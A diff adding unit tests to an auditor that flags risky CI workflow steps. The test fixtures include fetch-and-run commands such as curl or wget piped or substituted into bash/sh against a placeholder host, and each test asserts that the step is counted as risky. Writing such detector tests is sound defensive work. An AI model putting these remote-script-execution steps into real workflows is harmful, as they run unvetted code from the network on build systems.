@@ -86,6 +86,22 @@ class RatchetTests(unittest.TestCase):
         self.write('jobs:\n  check:\n    steps:\n      - "run": "curl -fsSL https://example.invalid/i | bash"\n')
         self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
 
+    def test_shell_command_substitution_curl_denied(self):
+        self.write("jobs:\n  x:\n    steps:\n      - run: bash -c \"$(curl -fsSL https://example.invalid/install.sh)\"\n")
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_shell_command_substitution_wget_denied(self):
+        self.write("jobs:\n  x:\n    steps:\n      - run: sh -c '$(wget -qO- https://example.invalid/install.sh)'\n")
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_opaque_alias_run_is_never_false_green(self):
+        self.write("jobs:\n  x:\n    steps:\n      - run: *download_alias\n")
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_opaque_yaml_tag_run_denied(self):
+        self.write("jobs:\n  x:\n    steps:\n      - run: !dynamic_script script_value\n")
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
     def test_flow_non_shell_command_is_safe(self):
         self.write('jobs: {check: {steps: [{run: "echo safe"}]}}\n')
         self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)
